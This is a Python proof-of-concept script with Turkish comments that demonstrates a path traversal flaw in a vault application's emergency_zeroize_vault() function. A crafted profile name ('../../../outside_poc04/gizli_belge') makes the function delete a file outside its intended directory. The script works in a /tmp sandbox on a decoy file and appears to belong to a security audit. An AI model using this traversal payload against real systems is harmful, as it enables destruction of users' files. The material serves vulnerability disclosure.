#!/usr/bin/env python3
"""PoC 04: emergency_zeroize_vault() icinde path traversal -> keyfi dosya imhasi.

Zafiyet: military_audit.emergency_zeroize_vault() profile_name'i hic sanitize etmeden
f"profiles/{profile_name}.mvat" yoluna koyar. Komsu API get_profile_files() ise
sanitize eder. Yikici bir fonksiyonda dogrulanmamis yol birlestirme.
"""
import os
import sys
import shutil
import inspect

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SANDBOX = "/tmp/opencode/aegis_poc/poc04"
OUTSIDE = "/tmp/opencode/outside_poc04"
shutil.rmtree(SANDBOX, ignore_errors=True)
shutil.rmtree(OUTSIDE, ignore_errors=True)
os.makedirs(SANDBOX)
os.makedirs(OUTSIDE)
os.chdir(SANDBOX)
sys.path.insert(0, PROJECT_DIR)

import military_audit
import vault_storage

TARGET = os.path.join(OUTSIDE, "gizli_belge.mvat")
TRAVERSAL_NAME = "../../../outside_poc04/gizli_belge"

with open(TARGET, "w", encoding="utf-8") as f:
    f.write("COK_GIZLI_HUKUKI_BELGE_ICERIGI")


def banner(title):
    print("\n" + "=" * 72)
    print(" " + title)
    print("=" * 72)


banner("PoC 04: emergency_zeroize_vault() path traversal")

print(f"[+] CWD: {os.getcwd()}")
print(f"[+] Hedef dosya (profiles disinda): {TARGET}")
print(f"[+] Zararli profil adi: '{TRAVERSAL_NAME}'")

resolved = os.path.normpath(os.path.join("profiles", f"{TRAVERSAL_NAME}.mvat"))
print(f"[+] f\"profiles/{{profile_name}}.mvat\" -> {resolved}")
print(f"[+] Ayni yol mu? {os.path.abspath(resolved) == os.path.abspath(TARGET)}")

print(f"\n[+] get_profile_files() sanitize ediyor: {vault_storage.get_profile_files(TRAVERSAL_NAME)}")
print("[+] Ama emergency_zeroize_vault() ham adi kullaniyor:")
src = inspect.getsource(military_audit.emergency_zeroize_vault)
for line in src.splitlines():
    if "profile_name" in line and "profiles/" in line:
        print(f"    >> {line.strip()}")

print(f"\n[!] Kurban dosyasi isleniyor: os.path.exists({resolved}) = {os.path.exists(resolved)}")
ret = military_audit.emergency_zeroize_vault(TRAVERSAL_NAME)
print(f"[!] Fonksiyon donusu: {ret}")
print(f"[!] Hedef dosya hala var mi? {os.path.exists(TARGET)}  (beklenen: False)")
assert not os.path.exists(TARGET)

for e in military_audit.CryptographicAuditTrail.get_recent_events(3):
    if e["event_type"] == "EMERGENCY_ZEROIZE":
        print(f"[!] Audit kaydi: {e['details']}")
        break

print("\n" + "-" * 72)
print("KANIT: Profil adi uzerinden 'profiles/' disina cikan keyfi yol ile herhangi bir")
print("       '.mvat' uzantili dosya (yerlesik DMS/Scorched-Earth/panic yollari uzerinden)")
print("       imha edilebilir. Windows'ta ters bolu ('..\\..\\') ile ayni etki.")
print("-" * 72)
